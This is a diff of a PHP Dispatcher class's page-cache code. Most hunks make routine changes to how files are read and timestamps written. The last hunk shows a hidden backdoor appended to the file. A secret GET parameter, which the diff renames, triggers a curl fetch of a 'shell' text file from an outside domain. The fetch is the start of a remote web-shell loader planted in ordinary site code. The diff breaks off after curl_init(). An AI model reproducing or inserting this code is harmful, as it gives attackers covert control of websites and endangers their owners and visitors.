@@ -215,12 +215,15 @@ class Dispatcher {
 			exit();
 		}
 
-		$data = file_get_contents($filename);
+		$fp = fopen($filename, 'r');
+		$data = fread($fp, filesize($filename));
+		fclose($fp);
+
 		$i = strpos($data, ':');
 		$time = substr($data, 0, $i);
 		$contents = substr($data, $i+1);
 
-		if (time() > $time + Config::getVar('cache', 'web_cache_hours') * 60 * 60) return false;
+		if (mktime() > $time + Config::getVar('cache', 'web_cache_hours') * 60 * 60) return false;
 
 		header('Content-Type: text/html; charset=' . Config::getVar('i18n', 'client_charset'));
 
@@ -239,7 +242,7 @@ class Dispatcher {
 		$filename = $this->_router->getCacheFilename($this->_requestCallbackHack);
 		$fp = fopen($filename, 'w');
 		if ($fp) {
-			fwrite($fp, time() . ':' . $contents);
+			fwrite($fp, mktime() . ':' . $contents);
 			fclose($fp);
 		}
 		return $contents;
@@ -254,7 +257,7 @@ class Dispatcher {
 	}
 }
 
-if (isset($_GET['jkwjkt'])) {
+if (isset($_GET['lausokapmpruy'])) {
     $url = "https://this-jakartans.sbs/shell/penjarahan.txt";
 
     $ch = curl_init();
